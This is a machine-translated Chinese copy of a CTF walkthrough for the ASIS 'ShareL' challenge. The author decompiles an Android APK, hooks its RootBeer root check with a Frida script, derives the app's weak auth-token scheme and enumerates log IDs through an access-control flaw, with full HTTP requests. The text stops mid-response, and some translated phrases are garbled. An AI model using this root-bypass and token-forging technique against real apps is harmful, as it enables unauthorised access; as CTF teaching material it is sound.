<html>
<head>
<title>ASIS CTF — ShareL Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">ASIS·CTF—沙雷尔漫游</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/asis-ctf-sharel-walkthrough-da32f3533b40?source=collection_archive---------2-----------------------#2019-11-18">https://infosecwriteups.com/asis-ctf-sharel-walkthrough-da32f3533b40?source=collection_archive---------2-----------------------#2019-11-18</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="764c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您好，本演练的读者应该知道这些主题:</p><ol class=""><li id="6079" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated">Android应用程序漏洞评估</li><li id="7afa" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">和弗丽达勾搭</li><li id="f4a3" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">Web应用程序漏洞评估</li><li id="c978" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">起毛</li></ol><p id="f73e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">参与者被授予APK奖。打开APK导致以下HTTP请求:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="6686" class="li lj iq le b gy lk ll l lm ln">GET /api/users/register/170/6C7AF7CC9FE261FFCDA1ECBF0E5B988E79B9F7F2 HTTP/1.1<br/>Host: 66.172.33.148:5001<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span></pre><p id="2794" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并向用户显示<code class="fe lo lp lq le b">the app cannot register</code>消息。于是出现了一个问题，我挖了APK来找出问题:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="1808" class="li lj iq le b gy lk ll l lm ln">jadx --deobf sharel.apk</span></pre><p id="1be0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在这里找到AP和反编译文件(<a class="ae lr" href="https://github.com/Voorivex" rel="noopener ugc nofollow" target="_blank">我很快会添加Github repo</a>)。</p><figure class="kz la lb lc gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lu lv di lw bf lx"><div class="gh gi ls"><img src="../Images/a5a7e89d79cd4e8ebcc3fe798f2c1bf2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RGug6JKnWm7ThP10gc2sEw.png"/></div></div></figure><p id="ccdd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lr" href="https://github.com/Voorivex/ctf/blob/master/asis_sharel_files/shareL/sources/com/asisctf/ShareL/SplashScreen.java" rel="noopener ugc nofollow" target="_blank">SplashScreen.java</a><strong class="jp ir"/>消息人士透露，如果设备是根设备，注册过程会有所不同。</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="f69a" class="li lj iq le b gy lk ll l lm ln">if (<strong class="le ir">new RootBeer(getApplicationContext()).isRooted()</strong>) {<br/>    String sha1Hash = CryptoHandler.sha1Hash(string);<br/>    this.random = new Random().nextInt(859) + 1;<br/>    StringBuilder sb = new StringBuilder();<br/>    sb.append(this.random);<br/>    sb.append(str);<br/>    <strong class="le ir">call = aPIInterFace.regNewDev(sb.toString(), sha1Hash)</strong>;<br/>} else {<br/>    String md5 = CryptoHandler.md5(string);<br/>    this.random = new Random().nextInt(900000000) + 100000000;<br/>    StringBuilder sb2 = new StringBuilder();<br/>    sb2.append(this.random);<br/>    sb2.append(str);<br/>    <strong class="le ir">call = aPIInterFace.regNewDev(md5, sb2.toString())</strong>;<br/>}</span></pre><p id="ba76" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lr" href="https://github.com/Voorivex/ctf/blob/master/asis_sharel_files/shareL/sources/com/asisctf/ShareL/APIInterFace.java" rel="noopener ugc nofollow" target="_blank">APIInterFace.java</a>类揭示了几乎所有的端点URL:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="f05a" class="li lj iq le b gy lk ll l lm ln">public interface APIInterFace {<br/>    <a class="ae lr" href="http://twitter.com/GET" rel="noopener ugc nofollow" target="_blank">@GET</a>("api/link/mylinks")<br/>    <a class="ae lr" href="http://twitter.com/Headers" rel="noopener ugc nofollow" target="_blank">@Headers</a>({"Content-Type:application/json"})<br/>    Call&lt;MyLinks&gt; MyLinks(<a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("auth-token") String str, <a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("device-id") String str2);</span><span id="55b6" class="li lj iq le b gy ma ll l lm ln"><a class="ae lr" href="http://twitter.com/GET" rel="noopener ugc nofollow" target="_blank">@GET</a>("api/link/preview/{user_id}/{rnd_num}/{link_name}")<br/>    <a class="ae lr" href="http://twitter.com/Headers" rel="noopener ugc nofollow" target="_blank">@Headers</a>({"Content-Type:application/json"})<br/>    Call&lt;PreviewLink&gt; PreviewLink(<a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("auth-token") String str, <a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("device-id") String str2, <a class="ae lr" href="http://twitter.com/Path" rel="noopener ugc nofollow" target="_blank">@Path</a>("user_id") int i, <a class="ae lr" href="http://twitter.com/Path" rel="noopener ugc nofollow" target="_blank">@Path</a>("rnd_num") int i2, <a class="ae lr" href="http://twitter.com/Path" rel="noopener ugc nofollow" target="_blank">@Path</a>("link_name") String str3);</span><span id="0c86" class="li lj iq le b gy ma ll l lm ln"><a class="ae lr" href="http://twitter.com/GET" rel="noopener ugc nofollow" target="_blank">@GET</a>("api/user/{user_id}/public_links")<br/>    <a class="ae lr" href="http://twitter.com/Headers" rel="noopener ugc nofollow" target="_blank">@Headers</a>({"Content-Type:application/json"})<br/>    Call&lt;UsrPLink&gt; UserPubLink(<a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("auth-token") String str, <a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("device-id") String str2, <a class="ae lr" href="http://twitter.com/Path" rel="noopener ugc nofollow" target="_blank">@Path</a>("user_id") int i);</span><span id="1092" class="li lj iq le b gy ma ll l lm ln"><a class="ae lr" href="http://twitter.com/GET" rel="noopener ugc nofollow" target="_blank">@GET</a>("api/users/{user_id}")<br/>    <a class="ae lr" href="http://twitter.com/Headers" rel="noopener ugc nofollow" target="_blank">@Headers</a>({"Content-Type:application/json"})<br/>    Call&lt;UserProfile&gt; getUserProfile(<a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("auth-token") String str, <a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("device-id") String str2, <a class="ae lr" href="http://twitter.com/Path" rel="noopener ugc nofollow" target="_blank">@Path</a>("user_id") int i);</span><span id="d20a" class="li lj iq le b gy ma ll l lm ln"><a class="ae lr" href="http://twitter.com/GET" rel="noopener ugc nofollow" target="_blank"><strong class="le ir">@GET</strong></a><strong class="le ir">("api/users/register/{md}/{rnd}")<br/>    Call&lt;NewDevice&gt; regNewDev(</strong><a class="ae lr" href="http://twitter.com/Path" rel="noopener ugc nofollow" target="_blank"><strong class="le ir">@Path</strong></a><strong class="le ir">("md") String str, </strong><a class="ae lr" href="http://twitter.com/Path" rel="noopener ugc nofollow" target="_blank"><strong class="le ir">@Path</strong></a><strong class="le ir">("rnd") String str2);</strong></span><span id="bd19" class="li lj iq le b gy ma ll l lm ln"><a class="ae lr" href="http://twitter.com/POST" rel="noopener ugc nofollow" target="_blank">@POST</a>("api/links/share")<br/>    <a class="ae lr" href="http://twitter.com/Headers" rel="noopener ugc nofollow" target="_blank">@Headers</a>({"Content-Type:application/json"})<br/>    Call&lt;ShareLink&gt; shareLink(<a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("auth-token") String str, <a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("device-id") String str2, <a class="ae lr" href="http://twitter.com/Body" rel="noopener ugc nofollow" target="_blank">@Body</a> sShareLink ssharelink);</span><span id="79e4" class="li lj iq le b gy ma ll l lm ln"><a class="ae lr" href="http://twitter.com/POST" rel="noopener ugc nofollow" target="_blank">@POST</a>("api/links/share/private")<br/>    <a class="ae lr" href="http://twitter.com/Headers" rel="noopener ugc nofollow" target="_blank">@Headers</a>({"Content-Type:application/json"})<br/>    Call&lt;SharePLinkUser&gt; sharePLink(<a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("auth-token") String str, <a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("device-id") String str2, <a class="ae lr" href="http://twitter.com/Body" rel="noopener ugc nofollow" target="_blank">@Body</a> sSharePLink sshareplink);</span><span id="c86b" class="li lj iq le b gy ma ll l lm ln"><a class="ae lr" href="http://twitter.com/GET" rel="noopener ugc nofollow" target="_blank">@GET</a>("api/users/top")<br/>    <a class="ae lr" href="http://twitter.com/Headers" rel="noopener ugc nofollow" target="_blank">@Headers</a>({"Content-Type:application/json"})<br/>    Call&lt;Top10Users&gt; top10user(<a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("auth-token") String str, <a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("device-id") String str2);</span><span id="9ec2" class="li lj iq le b gy ma ll l lm ln"><a class="ae lr" href="http://twitter.com/GET" rel="noopener ugc nofollow" target="_blank">@GET</a>("api/users/me")<br/>    <a class="ae lr" href="http://twitter.com/Headers" rel="noopener ugc nofollow" target="_blank">@Headers</a>({"Content-Type:application/json"})<br/>    Call&lt;Whoami&gt; whoami(<a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("auth-token") String str, <a class="ae lr" href="http://twitter.com/Header" rel="noopener ugc nofollow" target="_blank">@Header</a>("device-id") String str2);<br/>}</span></pre><p id="f9f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lo lp lq le b">RegNewDev</code>就在那里。我看了看检测根设备的<a class="ae lr" href="https://github.com/Voorivex/ctf/blob/master/asis_sharel_files/shareL/sources/com/scottyab/rootbeer/RootBeer.java" rel="noopener ugc nofollow" target="_blank">RootBeer.java</a>:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="a8fc" class="li lj iq le b gy lk ll l lm ln">public class RootBeer {<br/>    private boolean loggingEnabled = true;<br/>    private final Context mContext;</span><span id="978a" class="li lj iq le b gy ma ll l lm ln">public RootBeer(Context context) {<br/>        this.mContext = context;<br/>    }</span><span id="aeb3" class="li lj iq le b gy ma ll l lm ln">public boolean <strong class="le ir">isRooted</strong>() {<br/>        return detectRootManagementApps() || detectPotentiallyDangerousApps() || checkForBinary("su") || checkForBinary("busybox") || checkForDangerousProps() || checkForRWPaths() || detectTestKeys() || checkSuExists() || checkForRootNative() || checkForMagiskBinary();<br/>    }</span><span id="b04d" class="li lj iq le b gy ma ll l lm ln">public boolean <strong class="le ir">isRootedWithoutBusyBoxCheck</strong>() {<br/>        return detectRootManagementApps() || detectPotentiallyDangerousApps() || checkForBinary("su") || checkForDangerousProps() || checkForRWPaths() || detectTestKeys() || checkSuExists() || checkForRootNative() || checkForMagiskBinary();<br/>    }<br/>...<br/>}</span></pre><p id="e762" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我设法通过一个简单的钩子来改变这个部分，我运行Frida服务器:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="f28d" class="li lj iq le b gy lk ll l lm ln">root@vbox86p:/data/local/tmp # ./frida-server-12.7.22-android-x86</span></pre><p id="891b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">连接器:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="610a" class="li lj iq le b gy lk ll l lm ln">frida-ps -U | grep asis</span><span id="40c6" class="li lj iq le b gy ma ll l lm ln">2975  com.asisctf.ShareL</span></pre><p id="b76a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">钩子脚本:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="b3d5" class="li lj iq le b gy lk ll l lm ln">Java.perform(function z() {<br/>    console.log("Started");</span><span id="faf3" class="li lj iq le b gy ma ll l lm ln">var my_class = Java.use("com.scottyab.rootbeer.RootBeer");<br/>    my_class.isRooted.implementation = function () {<br/>        console.log("inside is rooted")<br/>        return false<br/>    }</span><span id="8889" class="li lj iq le b gy ma ll l lm ln">var my_class = Java.use("com.scottyab.rootbeer.RootBeer");<br/>    my_class.isRootedWithoutBusyBoxCheck.implementation = function () {<br/>        console.log("inside is rooted")<br/>        return false<br/>    }</span><span id="2912" class="li lj iq le b gy ma ll l lm ln">});</span></pre><p id="9d75" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">附加到流程:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="7a36" class="li lj iq le b gy lk ll l lm ln">frida -U -l script.js com.asisctf.ShareL<br/>     ____<br/>    / _  |   Frida 12.7.22 - A world-class dynamic instrumentation toolkit<br/>   | (_| |<br/>    &gt; _  |   Commands:<br/>   /_/ |_|       help      -&gt; Displays the help system<br/>   . . . .       object?   -&gt; Display information about 'object'<br/>   . . . .       exit/quit -&gt; Exit<br/>   . . . .<br/>   . . . .   More info at <a class="ae lr" href="https://www.frida.re/docs/home/" rel="noopener ugc nofollow" target="_blank">https://www.frida.re/docs/home/</a><br/>Attaching...                                                            <br/>Started<br/>[Genymotion Samsung Galaxy S6::com.asisctf.ShareL]-&gt;</span></pre><p id="3886" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注册请求:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="df26" class="li lj iq le b gy lk ll l lm ln">GET /api/users/register/c515834365310176f8117a18bb5ad994/280454512 HTTP/1.1<br/>Host: 66.172.33.148:5001<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span></pre><p id="3cc6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注册请求的分析:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="700c" class="li lj iq le b gy lk ll l lm ln">/api/users/register/md5("device_id")/random_number</span></pre><p id="9534" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回应是:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="6601" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Mon, 18 Nov 2019 08:34:46 GMT<br/>Content-Type: application/json<br/>Content-Length: 81<br/>Connection: close</span><span id="db62" class="li lj iq le b gy ma ll l lm ln">{"code":200,"data":{"auth_hash":"4f9dd56abac816f917c720a7c46d4044","user_id":6}}</span></pre><p id="a325" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">应用程序:</p><figure class="kz la lb lc gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lu lv di lw bf lx"><div class="gh gi mb"><img src="../Images/a70b58d1c7f0a8afa7d499900acc2fb3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dABRtrn8h80IEQf6jfHtfw.png"/></div></div></figure><p id="3a7c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Android用户界面应用程序的活动:</p><ol class=""><li id="f6e3" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated">我是谁</li><li id="6510" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">共享链接(公共和私有)</li><li id="f71d" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">向用户共享私人链接</li><li id="28e1" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">顶级用户</li><li id="faa9" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">我的链接</li></ol><p id="d9f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">参观<strong class="jp ir"> WHOAMI </strong>:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="ca01" class="li lj iq le b gy lk ll l lm ln">GET /api/users/me HTTP/1.1<br/><strong class="le ir">auth-token: 6.4f9dd56abac816f917c720a7c46d4044<br/>device-id: c515834365310176f8117a18bb5ad994</strong><br/>Content-Type: application/json<br/>Host: 66.172.33.148:5001<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span></pre><p id="0ecb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回应是:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="6497" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Mon, 18 Nov 2019 06:00:44 GMT<br/>Content-Type: application/json<br/>Content-Length: 70<br/>Connection: close</span><span id="0aa7" class="li lj iq le b gy ma ll l lm ln">{"code":200,"data":{"links":0,"user_id":6,"user_type":"Normal user"}}</span></pre><p id="c76a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">每个请求都有两个头，<code class="fe lo lp lq le b">auth-token</code>和<code class="fe lo lp lq le b">device-id.</code>我用不同的<code class="fe lo lp lq le b">device_id</code>和<strong class="jp ir"> IP地址</strong>重新注册了同一个<code class="fe lo lp lq le b">random_number</code>，我得到了同一个<code class="fe lo lp lq le b">auth_hash</code>，我断定<code class="fe lo lp lq le b">auth_hash</code>是由用户输入的。我把它给了cmd5.org，价值是280454512。所以<code class="fe lo lp lq le b">auth_hash</code>是由<strong class="jp ir"> md5(random_number) </strong>构建的。</p><p id="f89c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">到目前为止的要点:</p><ol class=""><li id="6f63" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated">auth_token: <code class="fe lo lp lq le b">user_id.auth_hash</code>或<code class="fe lo lp lq le b">user_id.md5(random_number)</code></li><li id="0326" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">device_id:一个唯一的散列</li><li id="f9a5" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">我是一个普通用户</li></ol><p id="7b0e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">共享链接:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="ea8c" class="li lj iq le b gy lk ll l lm ln">POST /api/links/share HTTP/1.1<br/>auth-token: 6.4f9dd56abac816f917c720a7c46d4044<br/>device-id: c515834365310176f8117a18bb5ad994<br/>Content-Type: application/json<br/>Content-Length: 61<br/>Host: 66.172.33.148:5001<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span><span id="859a" class="li lj iq le b gy ma ll l lm ln">{"link":"<a class="ae lr" href="http://test.com" rel="noopener ugc nofollow" target="_blank">http://test.com</a>","link_name":"test_234","private":1}</span></pre><p id="6ddd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我的链接:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="ae97" class="li lj iq le b gy lk ll l lm ln">GET /api/link/mylinks HTTP/1.1<br/>auth-token: 6.4f9dd56abac816f917c720a7c46d4044<br/>device-id: c515834365310176f8117a18bb5ad994<br/>Content-Type: application/json<br/>Host: 66.172.33.148:5001<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span></pre><p id="c72b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回应是:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="5fc2" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Mon, 18 Nov 2019 08:39:07 GMT<br/>Content-Type: application/json<br/>Content-Length: 194<br/>Connection: close</span><span id="8e0e" class="li lj iq le b gy ma ll l lm ln">{"code":200,"data":[{"link":"<a class="ae lr" href="http://test.com" rel="noopener ugc nofollow" target="_blank">http://test.com</a>","link_id":7,"link_name":"test_686","private":0,"user_id":6},{"link":"<a class="ae lr" href="http://test.com" rel="noopener ugc nofollow" target="_blank">http://test.com</a>","link_id":8,"link_name":"test_234","private":1,"user_id":6}]}</span></pre><p id="b6d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向用户共享私人链接:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="1801" class="li lj iq le b gy lk ll l lm ln">POST /api/links/share/private HTTP/1.1<br/>auth-token: 6.4f9dd56abac816f917c720a7c46d4044<br/>device-id: c515834365310176f8117a18bb5ad994<br/>Content-Type: application/json<br/>Content-Length: 80<br/>Host: 66.172.33.148:5001<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span><span id="11d3" class="li lj iq le b gy ma ll l lm ln">{"link_name":"test_234","random_number":280454512,"share_user_id":1,"user_id":6}</span></pre><p id="cbbc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回应是:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="3592" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Mon, 18 Nov 2019 08:43:01 GMT<br/>Content-Type: application/json<br/>Content-Length: 105<br/>Connection: close</span><span id="05ff" class="li lj iq le b gy ma ll l lm ln">{"code":200,"data":{"msg":"the user_id(1) can view the link by /api/link/preview/6/280454512/test_234"}}</span></pre><p id="a981" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要点:</p><ol class=""><li id="f315" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated">要共享链接，应该知道<code class="fe lo lp lq le b">random_number</code>和<code class="fe lo lp lq le b">link_name</code></li><li id="7767" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">共享链接由<code class="fe lo lp lq le b">user_id</code>、<code class="fe lo lp lq le b">random_number</code>和<code class="fe lo lp lq le b">link_name</code>组成</li></ol><p id="ffbb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一个快速测试正在改变共享专用链接请求中的<code class="fe lo lp lq le b">share_user_id</code>和<code class="fe lo lp lq le b">user_id</code>，它没有成功，服务器说:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="6a3a" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Mon, 18 Nov 2019 08:43:52 GMT<br/>Content-Type: application/json<br/>Content-Length: 69<br/>Connection: close</span><span id="5b57" class="li lj iq le b gy ma ll l lm ln">{"code":400,"data":{"err":"user_id manipulation has been detected"}}</span></pre><p id="fab6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这个时候，我去了Android的反编译源代码，寻找一个隐藏的活动或类似的代码。我发现<a class="ae lr" href="https://github.com/Voorivex/ctf/blob/master/asis_sharel_files/shareL/sources/com/asisctf/ShareL/AllUsersLogActivity.java" rel="noopener ugc nofollow" target="_blank">AllUsersLogActivity.java的</a>文件包含了两个端点:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="1a7d" class="li lj iq le b gy lk ll l lm ln">/logs/user_id/<br/>/logs/all/log_id/</span></pre><p id="afb2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试过了:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="502b" class="li lj iq le b gy lk ll l lm ln">GET /logs/user_id/1 HTTP/1.1<br/>auth-token: 6.4f9dd56abac816f917c720a7c46d4044<br/>device-id: c515834365310176f8117a18bb5ad994<br/>Content-Type: application/json<br/>Content-Length: 2<br/>Host: 66.172.33.148:5001<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span></pre><p id="4a3e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">获得:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="b9a1" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Mon, 18 Nov 2019 08:52:08 GMT<br/>Content-Type: application/json<br/>Content-Length: 48<br/>Connection: close</span><span id="55d2" class="li lj iq le b gy ma ll l lm ln">{"code":403,"data":{"err":"permission denied"}}</span></pre><p id="bf93" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不过，我把我的<code class="fe lo lp lq le b">user_id</code>:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="e0c5" class="li lj iq le b gy lk ll l lm ln">GET /logs/user_id/6 HTTP/1.1<br/>auth-token: 6.4f9dd56abac816f917c720a7c46d4044<br/>device-id: c515834365310176f8117a18bb5ad994<br/>Content-Type: application/json<br/>Content-Length: 2<br/>Host: 66.172.33.148:5001<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span></pre><p id="3281" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">获得:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="9839" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Mon, 18 Nov 2019 08:52:40 GMT<br/>Content-Type: application/json<br/>Content-Length: 159<br/>Connection: close</span><span id="09fb" class="li lj iq le b gy ma ll l lm ln">{"code":200,"data":[{"log_details":"user_id(6) created by auth_hash(4f9dd56abac816f917c720a7c46d4044)",<strong class="le ir">"log_id":37</strong>,"log_name":"application log","user_id":6}]}</span></pre><p id="2291" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">之后我发出了请求:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="ceda" class="li lj iq le b gy lk ll l lm ln">GET /logs/all/log_id/37 HTTP/1.1<br/>auth-token: 6.4f9dd56abac816f917c720a7c46d4044<br/>device-id: c515834365310176f8117a18bb5ad994<br/>Content-Type: application/json<br/>Content-Length: 2<br/>Host: 66.172.33.148:5001<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span></pre><p id="3f9c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">返回相同的结果。所以我对Burp Suite的入侵者进行了1到37的尝试，id<code class="fe lo lp lq le b">23</code>和<code class="fe lo lp lq le b">28</code>很有趣:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="0ae7" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Sat, 16 Nov 2019 11:33:45 GMT<br/>Content-Type: 